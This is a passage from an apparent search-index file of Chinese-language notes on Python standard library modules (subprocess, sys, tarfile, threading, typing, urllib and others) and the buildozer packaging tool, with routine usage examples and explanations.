'www.xxxxxdu.com']' returned non-zero exit status 68. >>> p 0 check_output 例, check_output() 调用的子进程正常与错误退出: >>> subprocess.check_output([\"echo\", \"Hello World!\"]) b'Hello World!\\n' >>> subprocess.check_output(\"exit 1\", shell=True) Traceback (most recent call last): File \"<stdin>\", line 1, in <module> File \"/usr/local/Cellar/python@3.9/3.9.10/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py\", line 424, in check_output return run(*popenargs, stdout=PIPE, timeout=timeout, check=True, File \"/usr/local/Cellar/python@3.9/3.9.10/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py\", line 528, in run raise CalledProcessError(retcode, process.args, subprocess.CalledProcessError: Command 'exit 1' returned non-zero exit status 1. >>> 注解 使用上面提到的三个方法: call(), check_call(), check_output() 时, 尽量不要将参数 stderr 和 stdout 设置为 subprocess.PIPE , 这几个函数默认都会等待子进程完成, 子进程产生大量的输出数据如果造成管道堵塞, 父进程再等待子进程完成可能造成死锁。 Popen 关于 shell: bool = False 参数 有需求在linux下使用pkexec来申请权限, 如执行ls 可以成功执行的两种调用: subprocess.Popen('pkexec ls', shell=True) subprocess.Popen(['sh', '-c', 'pkexec ls'], shell=False) 不能生效的调用(弹出界面一闪而逝或者压根不显示): subprocess.Popen(['pkexec', 'ls'], shell=False) 后面发现这个貌似实际是: pkexec ls & 与这个的区别: sh -c \"pkexec ls\" 注解 对于的系统命令而言, 当存在关键词参数且参数的值有空格时, 不要使用: Popen(['cmd', '--update=t t t']) 而是使用: Popen(['cmd', '--update', 't t t']) 因为前者会把 '--update=t t t' 解析为带引号的字符串: \"--update=t t t\" 从而导致识别不了关键字参数 --update 例1: import subprocess ret1 = subprocess.Popen([\"mkdir\",\"t1\"]) ret2 = subprocess.Popen(\"mkdir t2\", shell=True) 注解 终端输入的命令分为两种： 非交互式: 输入即可得到输出, 如 ifconfig 交互式: 输入进行某环境, 依赖再输入, 如 python 例2: import subprocess obj = subprocess.Popen(\"mkdir t3\", shell=True, cwd='/home/dev',) #在cwd目录下执行命令 import subprocess obj = subprocess.Popen([\"python\"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True) obj.stdin.write(\"print(1)\\n\") obj.stdin.write(\"print(2)\") obj.stdin.close() cmd_out = obj.stdout.read() obj.stdout.close() cmd_error = obj.stderr.read() obj.stderr.close() print(cmd_out) print(cmd_error) import subprocess obj = subprocess.Popen([\"python\"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True) obj.stdin.write(\"print(1)\\n\") obj.stdin.write(\"print(2)\") out_error_list = obj.communicate() print(out_error_list) import subprocess obj = subprocess.Popen([\"python\"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True) out_error_list = obj.communicate('print(\"hello\")') print(out_error_list) 例3: 创建一个子进程, 然后执行一个简单的命令: >>> import subprocess >>> p = subprocess.Popen('ls -l', shell=True) >>> total 164 -rw-r--r-- 1 root root 133 Jul 4 16:25 admin-openrc.sh -rw-r--r-- 1 root root 268 Jul 10 15:55 admin-openrc-v3.sh ... >>> p.returncode >>> p.wait() 0 >>> p.returncode 0 这里也可以使用 p = subprocess.Popen(['ls', '-cl']) 来创建子进程。 属性 Popen创建的子进程有一些有用的属性, 假设 p 是 Popen 创建的子进程, p 的属性包括： p.pid : 子进程的PID。 p.returncode : 该属性表示子进程的返回状态. returncode可能有多重情况: None —— 子进程尚未结束； ==0 —— 子进程正常退出； > 0 —— 子进程异常退出, returncode 对应于出错码； < 0 —— 子进程被信号杀掉了。 p.stdin, p.stdout, p.stderr : 子进程对应的一些初始文件, 如果调用Popen()的时候对应的参数是subprocess.PIPE, 则这里对应的属性是一个包裹了这个管道的 file 对象, 方法 subprocess模块的其他属性 subprocess.PIPE : 调用本模块提供的若干函数时, 可作为 std 参数的值, 为标准流文件打开一个管道. 例: 使用管道连接标准流文件: import subprocess child1 = subprocess.Popen([ 'ls' , '-l' ], stdout = subprocess.PIPE) child2 = subprocess.Popen([ 'wc' , '-l' ], stdin = child1.stdout, stdout = subprocess.PIPE) out = child2.communicate() child1.wait() child2.wait() print (out) 这里将子进程 child1 的标准输出作为子进程 child2 的标准输入, 父进程通过 communicate() 读取 child2 的标准输出后打印。 subprocess.STDOUT : 调用本模块提供的若干函数时, 可作为 stderr 参数的值, 将子进程的标准错误输出打印到标准输出。 subprocess模块定义的异常 总结 使用 Popen 可以在Python进程中创建子进程 如果只对子进程的执行退出状态感兴趣, 可以调用 subprocess.call() 函数 如果想通过异常处理机制解决子进程异常退出的情形, 可以考虑使用 subprocess.check_call() 和 subprocess.check_output。 如果希望获得子进程的输出, 可以调用 subprocess.check_output(), 但 Popen() 无疑是功能最强大的。 subprocess模块的缺陷在于默认提供的父子进程间通信手段有限, 只有管道；同时创建的子进程专门用来执行外部的程序或命令。 Linux下进程间通信的手段很多, 子进程也完全可能从创建之后继续调用 参考:: python - subprocess.Popen()多进程 subprocess: 可以在当前程序中执行其他程序或命令","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-subprocess.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-subprocess.html"},{"title":"sys","text":"官网: sys --- 系统相关的参数和函数 该模块提供了一些变量和函数。 这些变量可能被解释器使用，也可能由解释器提供。 这些函数会影响解释器。 本模块总是可用的。 仅记录常用的 属性 sys.argv 一个列表，其中包含了被传递给 Python 脚本的命令行参数。 argv[0] 为脚本的名称（是否是完整的路径名取决于操作系统）。 如果是通过 Python 解释器的命令行参数 -c 来执行的， argv[0] 会被设置成字符串 '-c' 。 如果没有脚本名被传递给 Python 解释器， argv[0] 为空字符串。 为了遍历标准输入，或者通过命令行传递的文件列表，参照 fileinput 模块 另请参阅 sys.orig_argv。 注解 在 Unix 上，系统传递的命令行参数是字节类型的。Python 使用文件系统编码和 \"surrogateescape\" 错误处理方案对它们进行解码。当需要原始字节时，可以通过 [os.fsencode(arg) for arg in sys.argv] 来获取。 sys.base_exec_prefix 官网说的有点复杂. 实际就是虚拟环境目录 sys.base_prefix 一般与上一个一致. sys.byteorder 本地字节顺序的指示符。 在大端序（最高有效位优先）操作系统上值为 'big' ， 在小端序（最低有效位优先）操作系统上为 'little' sys.executable: str 提供 Python 解释器的可执行二进制文件的绝对路径，仅在部分系统中此值有意义。 如果 Python 无法获取其可执行文件的真实路径，则 sys.executable 将为空字符串或 None。 sys.modules 这是一个字典，它将模块名称映射到已经被加载的模块。 这可以被操纵来强制重新加载模块和其他技巧。 然而，替换这个字典不一定会像预期的那样工作，从字典中删除重要的项目可能会导致 Python 出错。 如果你想对这个全局字典进行迭代，一定要使用 sys.modules.copy() 或 tuple(sys.modules) 来避免异常， 因为它的大小在迭代过程中可能会因为其他线程中的代码或活动的副作用而改变。 sys.orig_argv 传给 Python 可执行文件的原始命令行参数列表。 sys.path 一个由字符串组成的列表，用于指定模块的搜索路径。 初始化自环境变量 PYTHONPATH，再加上一条与安装有关的默认路径。 sys.platform 本字符串是一个平台标识符. 对于 Unix 系统（除 Linux 和 AIX 外），该字符串是 Python 构建时的 uname -s 返回的小写操作系统名称， 并附加了 uname -r 返回的系统版本的第一部分，如 'sunos5' 或 'freebsd8' 对于其他系统: 系统 平台值 AIX 'aix' Emscripten 'emscripten' Linux 'linux' WASI 'wasi' Windows 'win32' Windows/Cygwin 'cygwin' macOS 'darwin' sys.platlibdir 平台专用库目录。用于构建标准库的路径和已安装扩展模块的路径。 在大多数平台上，它等同于 \"lib\" sys.stdin;sys.stdout;sys.stderr 解释器用于标准输入、标准输出和标准错误的 文件对象 sys.version 一个包含 Python 解释器版本号加编译版本号以及所用编译器等额外信息的字符串。 请不要从中提取版本信息，而应当使用 version_info 以及 platform 模块所提供的函数。 sys.api_version 这个解释器的 C API 版本。当你在调试 Python及期扩展模板的版本冲突这个功能非常有用。 sys.version_info 一个包含版本号五部分的元组: major, minor, micro, releaselevel 和 serial。 除 releaselevel 外的所有值均为整数；发布级别值则为 'alpha', 'beta', 'candidate' 或 'final'。 对应于 Python 版本 2.0 的 version_info 值为 (2, 0, 0, 'final', 0)。 这些部分也可按名称访问，因此 sys.version_info[0] 就等价于 sys.version_info.major，依此类推。 在 3.1 版更改: 增加了以名称表示的各部分属性。 sys.maxsize 一个整数，表示 Py_ssize_t 类型的变量可以取到的最大值。 在 32 位平台上通常为 2**31 - 1，在 64 位平台上通常为 2**63 - 1。 sys.maxunicode 一个整数，表示最大的 Unicode 码点值，如 1114111 （十六进制为 0x10FFFF ）。 在 3.3 版更改: 在 PEP 393 之前，sys.maxunicode 曾是 0xFFFF 或 0x10FFFF， 具体取决于配置选项，该选项指定将 Unicode 字符存储为 UCS-2 还是 UCS-4。 函数","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-sys.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-sys.html"},{"title":"tarfile","text":"官网: https://docs.python.org/zh-cn/3/library/tarfile.html 读写tar归档文件, 包括使用 gzip, bz2 和 lzma 压缩的归档 常用: with tarfile.open('xxx.tar.gz', 'r:gz') as tar: tar.extractall(path='./data_dir')","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-tarfile.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-tarfile.html"},{"title":"tempfile","text":"tempfile --- 生成临时文件和目录 官网: https://docs.python.org/zh-cn/3/library/tempfile.html 该模块用于创建临时文件和目录，它可以跨平台使用。 TemporaryFile、NamedTemporaryFile、TemporaryDirectory 和 SpooledTemporaryFile 是带有自动清理功能的高级接口，可用作上下文管理器。 mkstemp() 和 mkdtemp() 是低级函数，使用完毕需手动清理。 本模块使用一个全局变量来存储由 gettempdir() 返回的临时文件使用的目录路径。 它可被直接设置以覆盖选择过程，但不建议这样做。 本模块中的所有函数都接受一个 dir 参数，它可被用于指定目录。 这是不会通过改变全局 API 行为对其他无准备代码造成影响的推荐做法。 用例: import tempfile # create a temporary file and write some data to it fp = tempfile.TemporaryFile() fp.write(b'Hello world!') # read data from file fp.seek(0) fp.read() b'Hello world!' # close the file, it will be removed fp.close() # create a temporary file using a context manager with tempfile.TemporaryFile() as fp: fp.write(b'Hello world!') fp.seek(0) fp.read() b'Hello world!' >>> # file is now closed and removed # create a temporary directory using the context manager with tempfile.TemporaryDirectory() as tmpdirname: print('created temporary directory', tmpdirname) >>> # directory and contents have been removed","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-tempfile.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-tempfile.html"},{"title":"threading模块","text":"官网文档:: threading threading.Thread的常见方法 run() 线程的主要执行体, 用于子类重写, 直接调用不会触发多线程 start() 启动新线程的方式, 开启一个新线程去执行run方法(实现多线程), 每个定义的线程只能start一次, 如果调用多次，则会报RuntimeError错误 join(timeout=None) 阻塞当前线程, 等待子进程执行结束 setDaemon(True) 将线程设置为守护线程, 如果主线程退出, 那么子线程也退出(若需要等待则使用join) is_alive() 线程是否存活，返回True或者False。 在线程的run()运行之后直到run()结束，该方法返回True。 threading.Condition(lock=None) 一个条件变量对象允许一个或多个线程等待，直到被另一个线程通知。 lock参数必须是一个Lock对象或者RLock对象， 并且会作为底层锁使用，默认使用RLock。 acquire(*args) 请求底层锁。此方法调用底层锁对应的方法和返回对应方法的返回值。 release() 释放底层锁。此方法调用底层所对应的方法，没有返回值。 wait(timeout=None) 释放锁，等待直到被通知（再获取锁）或者发生超时事件。 如果线程在调用此方法时本身并没有锁（即线程首先得有锁）， 则会报RuntimeError错误。这个方法释放底层锁，然后阻塞线程， 直到另一个线程中的同一个条件变量使用notify()或notify_all()唤醒， 或者超时事件发生，一旦被唤醒或者超时， 则会重新去获取锁并返回（成功返回True，否则返回False）。 timeout参数为浮点类型的秒数。 在RLock中使用一次release方法，可能并不能释放锁， 因为锁可能被acquire()了多次，但是在条件变量对象中， 它调用了RLock类的内部方法，可以一次就完全释放锁， 重新获取锁时也会重置锁的递归等级。 wait_for(predicate, timeout=None) 与wait方法相似，等待，直到条件计算为True， 返回最后一次的predicate的返回值。 predicate参数为一个返回值为布尔值的可调用对象。 调用此方法的时候会先调用predicate对象， 如果返回的就是True，则不会释放锁，直接往后执行。 另一个线程通知后，在它释放锁时， 才会触发wait_for方法等待事件， 这时如果predicate结果为True，则尝试获取锁， 获取成功后则继续往后执行， 如果为False，则会一直阻塞下去。此方法如果忽略timeout参数， 就相当于：while not predicate(): condition_lock.wait()。 notify(n=1) 唤醒一个等待这个条件的线程， 如果调用这个方法的线程在没有获得锁的情况下调用这个方法， 会报RuntimeError错误。 默认唤醒一个线程，可以通过参数n设置唤醒n个正在等待这个条件变量的线程， 如果没有线程在等待，调用这个方法不会发生任何事。 如果等待的线程中正好有n个线程，那么这个方法可以准确的唤醒这n个线程， 但是等待的线程超过指定的n个，有时候可能会唤醒超过n个的线程， 所以依赖参数n是不安全的行为。 notify_all() 唤醒所有等待这个条件的线程。 这个方法与notify()不同之处在于它唤醒所有线程，而不是特定n个。 默认为False(换而言之, 默认, 主线程,子线程互不影响) 同时个人建议设置为True, 可以保证对子线程的控制权, 否则可能会出现, 主线程结束后, 子线程成为孤儿进程, 被托管给系统的init进程, 直到完成后被回收 其他变量: name 线程的名称字符串，并没有什么实际含义，多个线程可以赋予相同的名称， 初始值由初始化方法来设置。 ident 线程的标识符，如果线程还没有启动， 则为None。ident是一个非零整数， 参见threading.get_ident()函数。 当线程结束后，它的ident可能被其他新创建的线程复用， 当然就算该线程结束了，它的ident依旧是可用的。 daemon 表示该线程是否是守护线程，True或者False。设置一个线程的daemon必须在线程的start()方法之前，否则会报RuntimeError错误。这个值默认继承自创建它的线程，主线程默认是非守护线程的，所以在主线程中创建的线程默认都是非守护线程的，即daemon=False。 Lock() 互斥锁 获取一个互斥锁, 用于多线程时互斥访问. 不过会降低效率(类似写成了单任务) Semaphore() 信号量Semaphore 与 Lock()_ 的区别是, Semaphore 支持同时对多个使用. Semaphore 内部维护了一个计数器. 获取锁的时候, 计数器减一, 释放锁的时候加一 一些坑 __new__方法是支持多线程的， 所以对于使用__new__实现的单例对象, 不存在多线程的线程安全问题, 更详细的说明, 知识在 __new__内部的操作没有线程安全问题, 可以保证多线程环境下返回的都是同一个对象, 但是其他方法, 存在同时访问的对象, 该加锁还是要加锁 class Single(object): \"\"\" single instance, attention son class's __init__ will exec once \"\"\" __instance = None def __new__(cls, *args, **kwargs): if cls.__instance is None: cls.__instance = super().__new__(cls, ) return cls.__instance if __name__ == '__main__': class P(Single): p = 0 # _instance = None # @classmethod # def instance(cls,): # if cls._instance is None: # cls._instance = cls() # return cls._instance def __init__(self): time.sleep(random.randint(0, 5)) def set_p(self): self.p += 1 print(f'p={self.p}', ) def set_p(): time.sleep(random.randint(0, 5)) pp = P() print(pp) pp.set_p() t_list = [] for _ in range(20): t_list.append(threading.Thread(target=set_p)) for t in t_list: t.start() 输出(某些顺序 kennel不一样): <__main__.P object at 0x1107de4c0> p=1 <__main__.P object at 0x1107de4c0><__main__.P object at 0x1107de4c0> p=2 p=3 <__main__.P object at 0x1107de4c0> <__main__.P object at 0x1107de4c0> p=4 p=5 <__main__.P object at 0x1107de4c0> p=6 <__main__.P object at 0x1107de4c0> p=7 <__main__.P object at 0x1107de4c0><__main__.P object at 0x1107de4c0> p=8 <__main__.P object at 0x1107de4c0> p=9 p=10 <__main__.P object at 0x1107de4c0><__main__.P object at 0x1107de4c0> <__main__.P object at 0x1107de4c0> p=11<__main__.P object at 0x1107de4c0> p=12 <__main__.P object at 0x1107de4c0> p=13 p=14 p=15 <__main__.P object at 0x1107de4c0> p=16 <__main__.P object at 0x1107de4c0><__main__.P object at 0x1107de4c0> p=17 p=18 <__main__.P object at 0x1107de4c0> p=19 <__main__.P object at 0x1107de4c0> p=20","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-threading.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-threading.html"},{"title":"timeit","text":"官网: timeit --- 测量小代码片段的执行时间 此模块提供了一种简单的方法来计算一小段 Python 代码的耗时。 它有 命令行接口 以及一个 可调用 方法。 它避免了许多测量时间的常见陷阱。 另见 Tim Peter 在 O'Reilly 出版的 Python Cookbook 第二版中\"算法\"章节的概述。 看语句的执行时间 如: print(timeit.timeit('set([x for x in [1, 3, 5]])')) print(timeit.timeit('set(x for x in [1, 3, 5])')) 源码，主要有两个方法: def timeit(stmt=\"pass\", setup=\"pass\", timer=default_timer, number=default_number, globals=None): \"\"\"Convenience function to create Timer object and call timeit method.\"\"\" return Timer(stmt, setup, timer, globals).timeit(number) def repeat(stmt=\"pass\", setup=\"pass\", timer=default_timer, repeat=default_repeat, number=default_number, globals=None): \"\"\"Convenience function to create Timer object and call repeat method.\"\"\" return Timer(stmt, setup, timer, globals).repeat(repeat, number) 参数解析： stmt statement，需要计算的代码字符串。（本地测的时候，不支持外部的变量） setup statement的前置执行，比如可以在这里import或者定义变量 timer 默认是 default_timer = time.perf_counter ，使用的计时器 number 指定执行的次数，默认是1000000（3.6的源码默认是100w） globals 执行的命名空间 repeat 重复次数，3.6源码默认是3","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-timeit.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-timeit.html"},{"title":"tkinter","text":"geometry的作用 设置窗口的宽和高，就算窗口已经通过resizable函数禁止调整宽高； 还可以移动窗口在屏幕上的位置: root = tk.Tk() # 设置为禁止调整宽、高 root.resizable(0,0) # 大小设置为 600 x 600 root.geometry('600x600') 移动窗口位置, 加号风格, 第1个加号是距离屏幕左边的宽， 第2个加号是距离屏幕顶部的高, 可为负数: root.geometry('+0+0') root.geometry('+300+400') # 为负数移动到屏幕外, 可以隐藏窗口 root.geometry('+-3000+-4000') # 也可以一起设置 root.geometry('300x250+500+240') 参数为None, 获取窗口位置: root.geometry(None) # '300x250+336+55' #### 布局管理器 grid、pack、place 参考: https://blog.csdn.net/Oh_Python/article/details/124196792 grid表格布局，采用表格结构组织组件，子组件的位置由行和列的单元格确定，并且可以跨行和跨列，从而实现复杂的布局。 pack按照组件的创建顺序将子组件添加到父组件中，按照垂直或者水平的方向自然排布，如果不指定任何选项，默认在父组件中自顶向下垂直添加组件。pack是代码量最少，最简单的一种，可以用于快速生成界面。 place 布局管理器可以通过坐标精确控制组件的位置，适用于一些布局更加灵活的场景。 ### other task.cancel() 只能取消状态为 pending的任务, 否则将毫无作用","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-tkinter.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-tkinter.html"},{"title":"traceback","text":"写几个常用的吧暂时.","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-traceback.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-traceback.html"},{"title":"types","text":"types --- 动态类型创建和内置类型名称 官网: https://docs.python.org/zh-cn/3/library/types.html 此模块定义了一些工具函数，用于协助动态创建新的类型。 它还为某些对象类型定义了名称，这些名称由标准 Python 解释器所使用，但并不像内置的 int 或 str 那样对外公开。 最后，它还额外提供了一些类型相关但重要程度不足以作为内置对象的工具类和函数。 动态类型创建 标准解释器类型 此模块为许多类型提供了实现 Python 解释器所要求的名称。 它刻意地避免了包含某些仅在处理过程中偶然出现的类型，例如 listiterator 类型。 此种名称的典型应用如 isinstance() 或 issubclass() 检测。 如果你要实例化这些类型中的任何一种，请注意其签名在不同 Python 版本之间可能出现变化。 以下类型有相应的标准名称定义： types.NoneType None 的类型。 3.10 新版功能. types.FunctionType . types.LambdaType 用户自定义函数以及由 lambda 表达式所创建函数的类型。 引发一个 审计事件 function.__new__，附带参数 code。 此审计事件只会被函数对象的直接实例化引发，而不会被普通编译所引发。 types.GeneratorType generator 迭代器对象的类型，由生成器函数创建。 types.CoroutineType coroutine 对象的类型，由 async def 函数创建。 3.5 新版功能. types.AsyncGeneratorType asynchronous generator 迭代器对象的类型，由异步生成器函数创建。 3.6 新版功能. types.CellType 单元对象的类型：这种对象被用作函数中自由变量的容器。 3.8 新版功能. types.MethodType 用户自定义类实例方法的类型。 types.BuiltinFunctionType . types.BuiltinMethodType 内置函数例如 len() 或 sys.exit() 以及内置类方法的类型。 （这里所说的\"内置\"是指\"以 C 语言编写\"。） types.WrapperDescriptorType 某些内置数据类型和基类的方法的类型，例如 object.__init__() 或 object.__lt__()。 types.MethodWrapperType 某些内置数据类型和基类的 绑定 方法的类型。 例如 object().__str__ 所属的类型。 types.NotImplementedType NotImplemented 的类型。 types.MethodDescriptorType 某些内置数据类型方法例如 str.join() 的类型。 types.ClassMethodDescriptorType 某些内置数据类型 非绑定 类方法例如 dict.__dict__['fromkeys'] 的类型。 class types.ModuleType(name, doc=None) 模块 的类型。 构造器接受待创建模块的名称并以其 docstring 作为可选参数。 备注: 如果你希望设置各种由导入控制的属性，请使用 importlib.util.module_from_spec() 来创建一个新模块。 __doc__ 模块的 docstring。 默认为 None。 __loader__ 用于加载模块的 loader。 默认为 None。 This attribute is to match importlib.machinery.ModuleSpec. loader as stored in the __spec__ object. 注解 未来的 Python 版本可能会停止默认设置此属性。 为了避免这个潜在变化的影响，如果你明确地需要使用此属性则推荐改从 __spec__ 属性读取 或是使用 getattr(module, \"__loader__\", None)。 在 3.4 版更改: 默认为 None。 之前该属性为可选项。 __name__ 模块的名称。 应当能匹配 importlib.machinery.ModuleSpec.name。 __package__ 一个模块所属的 package。 如果模块为最高层级的（即不是任何特定包的组成部分）则该属性应设为 ''， 否则它应设为特定包的名称 (如果模块本身也是一个包则名称可以为 __name__)。 默认为 None。 This attribute is to match importlib.machinery.ModuleSpec.parent as stored in the __spec__ object. 注解 未来的 Python 版本可能停止默认设置此属性。 为了避免这个潜在变化的影响，如果你明确地需要使用此属性则推荐改从 __spec__ 属性读取或是使用 getattr(module, \"__package__\", None)。 在 3.4 版更改: 默认为 None。 之前该属性为可选项。 __spec__ 模块的导入系统相关状态的记录。 应当是一个 importlib.machinery.ModuleSpec 的实例。 types.EllipsisType Ellipsis 的类型。 class types.GenericAlias(t_origin, t_args) 形参化泛型 的类型，例如 list[int]。 t_origin 应当是一个非形参化的泛型类，例如 list, tuple 或 dict。 t_args 应当是一个形参化 t_origin 的 tuple (长度可以为 1): >>> from types import GenericAlias list[int] == GenericAlias(list, (int,)) True dict[str, int] == GenericAlias(dict, (str, int)) True 在 3.9.2 版更改: 此类型现在可以被子类化。 class types.UnionType 合并类型表达式 的类型。 types.FrameType 帧对象的类型，例如 tb.tb_frame 中的对象，其中 tb 是一个回溯对象。 types.GetSetDescriptorType 使用 PyGetSetDef 在扩展模块中定义的对象的类型，例如 FrameType.f_locals 或 array.array.typecode。 此类型被用作对象属性的描述器；它的目的与 property 类型相同，但专门针对在扩展模块中定义的类。 types.MemberDescriptorType 使用 PyMemberDef 在扩展模块中定义的对象的类型，例如 datetime.timedelta.days。 此类型被用作使用标准转换函数的简单 C 数据成员的描述器；它的目的与 property 类型相同，但专门针对在扩展模块中定义的类。 CPython 实现细节： 在 Python 的其它实现中，此类型可能与 GetSetDescriptorType 完全相同。 class types.MappingProxyType(mapping) 一个映射的只读代理。 它提供了对映射条目的动态视图，这意味着当映射发生改变时，视图会反映这些改变。 在 3.9 版更改: 更新为支持 PEP 584 所新增的合并 (|) 运算符，它会简单地委托给下层的映射。 proxy[key] 返回下层的映射中以 key 为键的项。 如果下层的映射中不存在键 key 则引发 KeyError。 iter(proxy) 返回由下层映射的键为元素的迭代器。 这是 iter(proxy.keys()) 的快捷方式。 len(proxy) 返回下层映射中的项数。 copy() 返回下层映射的浅拷贝。 get(key[, default]) 如果 key 存在于下层映射中则返回 key 的值，否则返回 default。 如果 default 未给出则默认为 None，因而此方法绝不会引发 KeyError。 items() 返回由下层映射的项 ((键, 值) 对) 组成的一个新视图。 keys() 返回由下层映射的键组成的一个新视图。 values() 返回由下层映射的值组成的一个新视图。 reversed(proxy) 返回一个包含下层映射的键的反向迭代器。 附加工具类/函数 协程工具函数","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-types.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-types.html"},{"title":"typing","text":"类型注解模块 Union Union 是当有多种可能的数据类型时使用，比如函数有可能根据不同情况有时返回str或返回list，那么就可以写成: Union[list, str] Optional Optional 是Union的一个简化， 当 数据类型中有可能是None时，比如有可能是str也有可能是None， 则: Optional[str] 相当于: Union[str, None] 注意 和 函数有默认参数None有区别，有区别，有区别，不可省略默认参数，如下示例: # 原始 def func(args = None): # 错 def func(args:Optional[str]) -> None: # 对 def func(args:Optional[str] = None) -> None: Type 表示值为所指定类或其子类: arg1: Type[ClassObj] Callable 表示可调用对象, 支持指定参数与返回值. eg, 异步函数的类型注解: Callable[..., Awaitable] 表示是async函数, 且参数任意, 相当于此函数: async def fun(...) -> Awaitable: 判断注解是否引入了typing Python 中没有强定义类型, 不过可以使用类型注解, 如: @dataclass class Person(object): name: str pet: List[Cat] = field(default_factory=list) pet2: Cat = field(default_factory=Cat) 类型注解除了使用基础的数据类型, 还可以使用 typing 模块下的定义, 判断是否是typing下的注解: from typing import _GenericAlias for f in fields(Person): print('type', f.type) if isinstance(f.type, _GenericAlias): print(f'{f.name} is isinstance of _GenericAlias') 获取typing注解的详细信息 获取注解参数列表, 使用: typing.get_args() 获取注解的详细类型, 如: In [31]: import typing In [32]: typing.get_args(typing.Dict[str, tuple]) Out[32]: (<class 'str'>, <class 'tuple'>) 返回结果是一个元组 获取相关基础类型 获取注解原始类型, 使用 typing.get_origin In [33]: typing.get_origin(typing.Dict[str, tuple]) Out[33]: <class 'dict'>","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-typing.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-typing.html"},{"title":"unicodedata","text":"定义了以下函数 此外，该模块暴露了以下常量： unicodedata.unidata_version 此模块中使用的 Unicode 数据库的版本。 unicodedata.ucd_3_2_0 这是一个与整个模块具有相同方法的对象， 但对于需要此特定版本的 Unicode 数据库（如 IDNA ）的应用程序，则使用 Unicode 数据库版本 3.2 。","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-unicodedata.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-unicodedata.html"},{"title":"urllib","text":"url编码 parse.urlencode, 将python字典数据返回url格式的数据 parse.quote, 将url格式数据编码 parse.unquote, 上一个结果的解码, 返回普通url格式数据 例: data = {'a': 1, 'b': 2, } # 将python对象转换为url格式 r = parse.urlencode(data) _logger.info(r) # a=1&b=2 # url 编码， & = 等字符都会被编码 r = parse.quote(r) _logger.info(r) # a%3D1%26b%3D2 # url 解码， 仅转换为普通字符传拼接的形式 r = parse.unquote(r) _logger.info(r) # a=1&b=2","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-urllib.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-urllib.html"},{"title":"weakref","text":"弱引用 官网: https://docs.python.org/zh-cn/3/library/weakref.html weakref 模块允许Python程序员创建对象的 weak references 。 在下文中，术语 referent 表示由弱引用引用的对象。 对对象的弱引用不能保证对象存活：当对像的引用只剩弱引用时， garbage collection 可以销毁引用并将其内存重用于其他内容。 但是，在实际销毁对象之前，即使没有强引用，弱引用也一直能返回该对象。 弱引用的主要用途是实现保存大对象的高速缓存或映射，但又不希望大对象仅仅因为它出现在高速缓存或映射中而保持存活。 最常用:","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-weakref.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-weakref.html"},{"title":"buildozer","text":"暂时找到的官网文档: https://buildozer.readthedocs.io/en/latest/installation.html 一个用于构建Python应用程序的命令行工具, 可以将python代码打包为安卓的APK或者IPhone的IPA. 注解 这玩意儿一开始只是为了kivy这个开源跨平台GUI框架开发的, 后面升级了支持基本上所有的Python了, 就是需要手动配置. 安装: pip install buildozer 主要特点 跨平台支持： Buildozer可以在多个操作系统上使用，包括Windows、Linux和macOS等。 简单易用： 用户只需要编辑buildozer.spec文件，即可轻松配置应用程序的构建选项和依赖项。 自动化依赖管理： Buildozer会自动下载和安装所需的依赖项和库，而无需手动干预。 支持Python 2和3： Buildozer可以进行Python版本选择，并在构建过程中自动处理不同版本的差异。 多种构建选项： Buildozer支持多种构建选项，例如debug和release版本、ARM和x86架构等。 高度可定制： Buildozer提供了大量的命令行选项和配置选项，以满足不同场景下的定制需求。 使用流程 配置文件设置 buildozer.spec 创建一个新的buildozer.spec文件。 该文件包含应用程序的配置和相关信息，例如应用程序名称、作者、版本号和依赖项等。 可以使用命令: buildozer init 来创建一个默认的buildozer.spec文件. 编辑buildozer.spec文件以包含所需的构建配置。 可以在此文件中指定需要的权限、启动屏幕、应用程序图标等。 应用的版本, 可以自动探测, 直接在文件入口的py文件加入: __version__ = \"1.0.3\" 即可 配置项说明 title：应用程序的名称。 package.name：应用程序的包名。 package.domain：应用程序的域名。 source.dir：应用程序的源代码目录。 requirements：应用程序所需的Python库和第三方库。 android.permissions：应用程序需要的Android权限。 android.api：应用程序需要的Android API级别。 android.sdk：Android SDK的路径。 ios.codesign.identity：iOS代码签名的身份。 APK构建(安卓使用) 安卓编译需要的前置包 debian/ubuntu20/22 sudo apt update sudo apt install -y git zip unzip openjdk-17-jdk python3-pip autoconf libtool pkg-config zlib1g-dev libncurses5-dev libncursesw5-dev libtinfo5 cmake libffi-dev libssl-dev pip3 install --user --upgrade Cython==0.29.33 virtualenv # the --user should be removed if you do this in a venv # add the following line at the end of your ~/.bashrc file export PATH=$PATH:~/.local/bin/ windows10/11, 需要打开 WSL的支持, 然后同样执行上述指令. 